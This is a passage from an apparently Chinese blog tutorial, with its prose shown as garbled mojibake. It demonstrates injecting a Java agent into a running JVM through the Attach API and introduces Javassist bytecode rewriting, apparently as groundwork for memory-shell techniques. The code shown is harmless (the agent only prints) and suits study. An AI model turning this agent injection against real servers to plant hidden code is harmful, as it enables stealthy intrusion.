class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>system<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">systemPath</span>&gt;</span>$&#123;JAVA_HOME&#125;/lib/tools.jar<span class="hljs-tag">&lt;/<span class="hljs-name">systemPath</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">get_PID</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();<br>        <span class="hljs-keyword">for</span> (VirtualMachineDescriptor vmd : list) &#123;<br>            <span class="hljs-keyword">if</span>(vmd.displayName().equals(<span class="hljs-string">&quot;com.test.get_PID&quot;</span>)) &#123;<br>                System.out.println(vmd.id());<br>            &#125;<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523760.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h4 id="å®ç°-agentmain-Agent"><a href="#å®ç°-agentmain-Agent" class="headerlink" title="å®ç° agentmain-Agent"></a>å®ç° agentmain-Agent</h4><p>ç¼–å†™ä¸€ä¸ª <code>Sleep_Hello</code>ç±»ï¼Œæ¨¡æ‹Ÿæ­£åœ¨è¿è¡Œçš„ JVM</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Thread.sleep;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SleepHello</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;hello&quot;</span>);<br>            sleep(<span class="hljs-number">5000</span>);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>





<p>ç¼–å†™JavaAgentAgentmain</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.agentmain.agent;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Thread.sleep;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavaAgentAgentmain</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;agentmain-Agent&quot;</span>);<br>            sleep(<span class="hljs-number">3000</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>é…ç½® MANIFEST.MF æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">Manifest-Version: 1.0<br>Agent-Class: com.agentmain.agent.JavaAgentAgentmain<br>Can-Redefine-Classes: true<br>Can-Retransform-Classes: true<br>Can-Set-Native-Method-Prefix: true<br></code></pre></td></tr></table></figure>



<p>ä¹‹åç¼–è¯‘å¾—åˆ° <strong>Agentmain.jar</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523062.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>ç¼–å†™æµ‹è¯•ç±»Inject_Agentï¼Œå¯ä»¥å°†agentæ³¨å…¥åˆ°æ­£åœ¨è¿è¡Œçš„JVMä¸­</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test;<br><br><span class="hljs-keyword">import</span> com.sun.tools.attach.*;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InjectAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentInitializationException &#123;<br>        <span class="hljs-comment">//è°ƒç”¨VirtualMachine.list()è·å–æ­£åœ¨è¿è¡Œçš„JVMåˆ—è¡¨</span><br>        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();<br>        String path=<span class="hljs-string">&quot;D:\\JavaCode\\å†…å­˜é©¬\\JavaAgentTest\\dist\\Agentmain.jar&quot;</span>;<br><br>        <span class="hljs-keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;<br>            System.out.println(vmd.displayName());<br>            <span class="hljs-comment">//éå†æ¯ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„JVMï¼Œå¦‚æœJVMåç§°ä¸ºSleep_Helloåˆ™è¿æ¥è¯¥JVMå¹¶åŠ è½½ç‰¹å®šAgent</span><br>            <span class="hljs-keyword">if</span>(vmd.displayName().contains(<span class="hljs-string">&quot;Sleep&quot;</span>))&#123;<br>                <span class="hljs-comment">//è¿æ¥æŒ‡å®šJVM</span><br>                <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">virtualMachine</span> <span class="hljs-operator">=</span> VirtualMachine.attach(vmd.id());<br>                <span class="hljs-comment">//åŠ è½½Agent</span><br>                virtualMachine.loadAgent(path);<br>                <span class="hljs-comment">//æ–­å¼€JVMè¿æ¥</span><br>                virtualMachine.detach();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>å…ˆè¿è¡Œ SleepHello.java å†è¿è¡Œ	InjectAgent.java</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523253.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h2 id="4-2-åŠ¨æ€ä¿®æ”¹å­—èŠ‚ç "><a href="#4-2-åŠ¨æ€ä¿®æ”¹å­—èŠ‚ç " class="headerlink" title="4.2 åŠ¨æ€ä¿®æ”¹å­—èŠ‚ç "></a>4.2 åŠ¨æ€ä¿®æ”¹å­—èŠ‚ç </h2><h3 id="4-2-1-Javassist"><a href="#4-2-1-Javassist" class="headerlink" title="4.2.1 Javassist"></a>4.2.1 Javassist</h3><p>ç”¨æ¥å¤„ç†Javaå­—èŠ‚ç çš„ç±»åº“ï¼Œå…è®¸åœ¨å·²ç»ç¼–è¯‘å¥½çš„ç±»ä¸­æ·»åŠ æ–°çš„æ–¹æ³•ï¼Œæˆ–è€…ä¿®æ”¹å·²æœ‰çš„æ–¹æ³•ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥é€šè¿‡æ‰‹åŠ¨çš„æ–¹å¼å»ç”Ÿæˆä¸€ä¸ªæ–°çš„ç±»å¯¹è±¡</p>
<h4 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>Java å­—èŠ‚ç ä»¥äºŒè¿›åˆ¶çš„å½¢å¼å­˜å‚¨åœ¨ .class æ–‡ä»¶ä¸­ï¼Œæ¯ä¸€ä¸ª.classæ–‡ä»¶åŒ…å«ä¸€ä¸ªJavaç±»æˆ–æ¥å£ã€‚Javaassist å°±æ˜¯ä¸€ä¸ªç”¨æ¥å¤„ç†Javaå­—èŠ‚ç çš„ç±»åº“ã€‚å®ƒå¯ä»¥åœ¨ä¸€ä¸ªå·²ç»ç¼–è¯‘å¥½çš„ç±»ä¸­æ·»åŠ æ–°çš„æ–¹æ³•ï¼Œæˆ–è€…æ˜¯ä¿®æ”¹å·²æœ‰çš„æ–¹æ³•ï¼Œå¹¶ä¸”ä¸éœ€è¦å¯¹å­—èŠ‚ç æ–¹é¢æœ‰æ·±å…¥çš„äº†è§£ã€‚åŒæ—¶ä¹Ÿå¯ä»¥é€šè¿‡æ‰‹åŠ¨çš„æ–¹å¼å»ç”Ÿæˆä¸€ä¸ªæ–°çš„ç±»å¯¹è±¡ã€‚</p>
<h4 id="ç±»æ± -ClassPool"><a href="#ç±»æ± -ClassPool" class="headerlink" title="ç±»æ±  ClassPool"></a>ç±»æ±  ClassPool</h4><p>ClassPoolæ˜¯ CtClass å¯¹è±¡çš„å®¹å™¨ã€‚å®ƒæŒ‰éœ€è¯»å–ç±»æ–‡ä»¶æ¥æ„é€  CtClass å¯¹è±¡ï¼Œå¹¶ä¸”ä¿å­˜ CtClass å¯¹è±¡ä»¥ä¾¿ä»¥åä½¿ç”¨ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ ClassPool ä¼šåœ¨å†…å­˜ä¸­ç»´æŠ¤æ‰€æœ‰è¢«å®ƒåˆ›å»ºè¿‡çš„ CtClassï¼Œå½“ CtClass æ•°é‡è¿‡å¤šæ—¶ï¼Œä¼šå ç”¨å¤§é‡çš„å†…å­˜ï¼ŒAPI ä¸­ç»™å‡ºçš„è§£å†³æ–¹æ¡ˆæ˜¯æœ‰æ„è¯†çš„è°ƒç”¨ CtClass çš„ detach() æ–¹æ³•ä»¥é‡Šæ”¾å†…å­˜ã€‚</p>
<p><strong>ä¸»è¦æ–¹æ³•</strong>æœ‰ä»¥ä¸‹å‡ ä¸ªï¼š</p>
<ul>
<li>getDefaultï¼šè·å–é»˜è®¤çš„ ClassPool å¯¹è±¡ã€‚</li>
<li>getã€getCtClassï¼šæ ¹æ®ç±»åè·å– CtClass å¯¹è±¡ï¼Œç”¨äºæ“ä½œç±»çš„å­—èŠ‚ç ã€‚</li>
<li>makeClassï¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ CtClass å¯¹è±¡ï¼Œç”¨äºæ–°å¢ç±»ã€‚</li>
<li>insertClassPathã€appendClassPathï¼šæ’å…¥ç±»æœç´¢è·¯å¾„ï¼Œæä¾›ç»™ç±»åŠ è½½å™¨ç”¨äºåŠ è½½ç±»ã€‚</li>
<li>toClassï¼šå°†ä¿®æ”¹åçš„ CtClass åŠ è½½è‡³å½“å‰çº¿ç¨‹çš„ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨ä¸­ã€‚é€šè¿‡è°ƒç”¨ CtClass çš„ toClass() æ–¹æ³•å®ç°äº†å°† CtClass è½¬æ¢ä¸º Class å¯¹è±¡ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨è¿è¡Œæ—¶ä½¿ç”¨è¿™ä¸ªç±»ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ä¸€æ—¦è°ƒç”¨è¯¥æ–¹æ³•ï¼Œåˆ™æ— æ³•ç»§ç»­ä¿®æ”¹å·²ç»è¢«åŠ è½½çš„ Class å¯¹è±¡ã€‚</li>
</ul>
<p>è·å¾—æ–¹æ³•å¦‚ä¸‹ï¼š</p>
<p>é€šè¿‡<code>ClassPool.getDefault()</code>ä½¿ç”¨JVMçš„ç±»æœç´¢è·¯å¾„ã€‚å¦‚æœç¨‹åºè¿è¡Œåœ¨JBossæˆ–è€…Tomcatçš„WebæœåŠ¡å™¨ä¸Šï¼Œåˆ™ClassPoolå¯èƒ½æ— æ³•æ‰¾åˆ°ç”¨æˆ·çš„ç±»ï¼Œå› ä¸ºWebæœåŠ¡å™¨ä¼šä½¿ç”¨å¤šä¸ªç±»åŠ è½½å™¨ä½œä¸ºç³»ç»Ÿç±»åŠ è½½å™¨ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒClassPoolå¿…é¡»æ·»åŠ é¢å¤–çš„æœç´¢è·¯å¾„</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//è·å¾—æ–¹æ³•</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-comment">//æ·»åŠ ç±»æœç´¢è·¯å¾„</span><br>cp.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(&lt;Class&gt;));<br></code></pre></td></tr></table></figure>







<h4 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h4><p>CtClass æ˜¯ Javassist ä¸­çš„ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œç”¨äºè¡¨ç¤ºä¸€ä¸ªç±»æ–‡ä»¶ã€‚</p>
<p><strong>CtClass éœ€è¦å…³æ³¨çš„æ–¹æ³•ï¼š</strong></p>
<ul>
<li>freezeï¼šå†»ç»“ä¸€ä¸ªç±»ï¼Œä½¿å…¶ä¸å¯ä¿®æ”¹ã€‚</li>
<li>isFrozenï¼šåˆ¤æ–­ä¸€ä¸ªç±»æ˜¯å¦å·²è¢«å†»ç»“ã€‚</li>
<li>pruneï¼šåˆ é™¤ç±»ä¸å¿…è¦çš„å±æ€§ï¼Œä»¥å‡å°‘å†…å­˜å ç”¨ã€‚è°ƒç”¨è¯¥æ–¹æ³•åï¼Œè®¸å¤šæ–¹æ³•æ— æ³•å°†æ— æ³•æ­£å¸¸ä½¿ç”¨ï¼Œæ…ç”¨ã€‚</li>
<li>defrostï¼šè§£å†»ä¸€ä¸ªç±»ï¼Œä½¿å…¶å¯ä»¥è¢«ä¿®æ”¹ã€‚å¦‚æœäº‹å…ˆçŸ¥é“ä¸€ä¸ªç±»ä¼šè¢« defrost ï¼Œ åˆ™ç¦æ­¢è°ƒç”¨ prune æ–¹æ³•ã€‚</li>
<li>detachï¼šå°†è¯¥ class ä» ClassPool ä¸­åˆ é™¤ã€‚</li>
<li>setSuperclassï¼šè®¾ç½®å½“å‰ç±»çš„çˆ¶ç±»ã€‚</li>
<li>writeFileï¼šå°† CtClass å¯¹è±¡è½¬æ¢ä¸ºç±»æ–‡ä»¶å¹¶å°†å…¶å†™å…¥æœ¬åœ°ç£ç›˜ã€‚</li>
<li>toClassï¼šé€šè¿‡ç±»åŠ è½½å™¨åŠ è½½è¯¥ CtClass ï¼Œç¤ºä¾‹ï¼š<code>Class clazz = cc.toClass();</code> ã€‚</li>
<li>toBytecodeï¼šè·å– CtClass çš„å­—èŠ‚ç ï¼Œç¤ºä¾‹ï¼š<code>byte[] b = cc.toBytecode();</code> ã€‚</li>
</ul>
<p>å¯ä»¥é€šè¿‡ä»¥ä¸‹ä»£ç è·å–</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">ClassPool.get(ClassName)<br></code></pre></td></tr></table></figure>

<h4 id="CtMethod-å’Œ-CtField"><a href="#CtMethod-å’Œ-CtField" class="headerlink" title="CtMethod å’Œ CtField"></a>CtMethod å’Œ CtField</h4><p>CtMethod å’Œ CtField åˆ†åˆ«ä»£è¡¨ Java ç±»ä¸­çš„æ–¹æ³•å’Œå­—æ®µã€‚é€šè¿‡ CtClass å¯¹è±¡ï¼Œå¯ä»¥è·å–ã€æ·»åŠ ã€åˆ é™¤æˆ–ä¿®æ”¹ç±»ä¸­çš„æ–¹æ³•å’Œå­—æ®µã€‚è¿™äº›å¯¹è±¡æä¾›äº†ä¸°å¯Œçš„ API ï¼Œç”¨äºæ“ä½œæ–¹æ³•å’Œå­—æ®µçš„å„ç§å±æ€§ï¼Œå¦‚è®¿é—®ä¿®é¥°ç¬¦ã€åç§°ã€è¿”å›ç±»å‹ç­‰ã€‚</p>
<p>CtMethod ä¸­çš„ä¸€äº›é‡è¦æ–¹æ³•ï¼š</p>
<ol>
<li>insertBeforeï¼šåœ¨æ–¹æ³•çš„èµ·å§‹ä½ç½®æ’å…¥ä»£ç ã€‚</li>
<li>insterAfterï¼šåœ¨æ–¹æ³•çš„æ‰€æœ‰ return è¯­å¥å‰æ’å…¥ä»£ç ä»¥ç¡®ä¿è¯­å¥èƒ½å¤Ÿè¢«æ‰§è¡Œï¼Œé™¤éé‡åˆ° exception ã€‚</li>
<li>insertAtï¼šåœ¨æŒ‡å®šçš„ä½ç½®æ’å…¥ä»£ç ã€‚</li>
<li>setBodyï¼šå°†æ–¹æ³•çš„å†…å®¹è®¾ç½®ä¸ºè¦å†™å…¥çš„ä»£ç ï¼Œå½“æ–¹æ³•è¢« abstract ä¿®é¥°æ—¶ï¼Œè¯¥ä¿®é¥°ç¬¦è¢«ç§»é™¤ã€‚</li>
<li>makeï¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æ–¹æ³•ã€‚</li>
</ol>
<p>åˆ©ç”¨ CtMethod ä¸­çš„ insertBeforeï¼ŒinsterAfterï¼ŒinsertAt ç­‰æ–¹æ³•å¯ä»¥å®ç° AOP å¢å¼ºåŠŸèƒ½ã€‚</p>
<p>é€šè¿‡<code>CtClass.getDeclaredMethod(MethodName)</code>è·å–ï¼Œå…¶ä¸­è¯¥ç±»æä¾›äº†ä¸€äº›æ–¹æ³•å¯ä»¥è®©æˆ‘ä»¬ç›´æ¥ä¿®æ”¹æ–¹æ³•ä½“ï¼Œæ–¹æ³•å¦‚ä¸‹ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CtMethod</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">CtBehavior</span> &#123;<br>    <br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CtBehavior</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">CtMethod</span> &#123;<br>    <span class="hljs-comment">//è®¾ç½®æ–¹æ³•ä½“</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBody</span><span class="hljs-params">(String src)</span>;<br><br>    <span class="hljs-comment">// æ’å…¥åœ¨æ–¹æ³•ä½“æœ€å‰é¢</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertBefore</span><span class="hljs-params">(String src)</span>;<br> <br>    <span class="hljs-comment">// æ’å…¥åœ¨æ–¹æ³•ä½“æœ€åé¢</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertAfter</span><span class="hljs-params">(String src)</span>;<br> <br>    <span class="hljs-comment">// åœ¨æ–¹æ³•ä½“çš„æŸä¸€è¡Œæ’å…¥å†…å®¹</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">insertAt</span><span class="hljs-params">(<span class="hljs-type">int</span> lineNum, String src)</span>;<br> <br>&#125;<br>    <br></code></pre></td></tr></table></figure>

<p>å…¶ä¸­ä¼ é€’ç»™<code>insertBefore</code>ã€<code>insertAfter</code>å’Œ<code>insertAt</code>çš„Stringå¯¹è±¡æ˜¯ç”±<code>Javassist</code>çš„ç¼–è¯‘å™¨è¿›è¡Œç¼–è¯‘çš„ã€‚è¯¥ç¼–è¯‘å™¨æ”¯æŒè¯­è¨€çš„æ‰©å±•ï¼Œä»¥ä¸‹ä»¥$ç¬¦å·å¼€å¤´çš„å‡ ä¸ªæ ‡è¯†ç¬¦å…·æœ‰ç‰¹æ®Šçš„å«ä¹‰ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081524285.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h4 id="Javassist-ä½¿ç”¨"><a href="#Javassist-ä½¿ç”¨" class="headerlink" title="Javassist ä½¿ç”¨"></a>Javassist ä½¿ç”¨</h4><p>ä¾èµ–ï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.27.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>



<p>ä½¿ç”¨ javassist åˆ›å»ºä¸€ä¸ª Person ç±»</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavassistDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">CreatePerson</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//è·å– CtClass å¯¹è±¡å®¹å™¨ ClassPool</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªæ–°ç±» Javassist.Learning.Person</span><br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;javassist.Person&quot;</span>);<br>        <span class="hljs-comment">//åˆ›å»ºä¸€ä¸ª Person ç±»çš„å±æ€§ name</span><br>        <span class="hljs-type">CtField</span> <span class="hljs-variable">ctField1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(classPool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>),<span class="hljs-string">&quot;name&quot;</span>, ctClass);<br>        <span class="hljs-comment">//è®¾ç½®å±æ€§è®¿é—®ç¬¦</span><br>        ctField1.setModifiers(Modifier.PRIVATE);<br>        <span class="hljs-comment">//å°†å±æ€§æ·»åŠ åˆ° Personä¸­ï¼Œå¹¶è®¾ç½®åˆå§‹å€¼</span><br>        ctClass.addField(ctField1,CtField.Initializer.constant(<span class="hljs-string">&quot;aaa&quot;</span>));<br><br>        <span class="hljs-comment">//å‘ Person ç±»ä¸­æ·»åŠ  setter å’Œ getter æ–¹æ³•</span><br>        ctClass.addMethod(CtNewMethod.setter(<span class="hljs-string">&quot;setName&quot;</span>,ctField1));<br>        ctClass.addMethod(CtNewMethod.getter(<span class="hljs-string">&quot;getName&quot;</span>,ctField1));<br><br>        <span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªæ— å‚æ„é€ </span><br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">ctConstructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, ctClass);<br>        <span class="hljs-comment">//è®¾ç½®æ–¹æ³•ä½“</span><br>        ctConstructor.setBody(<span class="hljs-string">&quot;&#123;name = \&quot;aaa\&quot;;&#125;&quot;</span>);<br>        <span class="hljs-comment">//å‘ Person ç±»ä¸­æ·»åŠ æ— å‚æ„é€ </span><br>        ctClass.addConstructor(ctConstructor);<br><br>        <span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªç±»æ–¹æ³• printName</span><br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtMethod</span>(CtClass.voidType, <span class="hljs-string">&quot;printName&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, ctClass);<br>        <span class="hljs-comment">//è®¾ç½®æ–¹æ³•è®¿é—®ç¬¦</span><br>        ctMethod.setModifiers(Modifier.PUBLIC);<br>        <span class="hljs-comment">//è®¾ç½®æ–¹æ³•ä½“</span><br>        ctMethod.setBody(<span class="hljs-string">&quot;&#123;System.out.println(\&quot;Hello World\&quot;);&#125;&quot;</span>);<br>        <span class="hljs-comment">//å°†æ–¹æ³•æ·»åŠ è‡³ Person ä¸­</span><br>        ctClass.addMethod(ctMethod);<br><br>        <span class="hljs-comment">//å°†ç”Ÿæˆçš„å­—èŠ‚ç å†™å…¥æ–‡ä»¶ä¸­</span><br>        ctClass.writeFile();<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;start&quot;</span>);<br>        CreatePerson();<br>        System.out.println(<span class="hljs-string">&quot;finish&quot;</span>);<br>    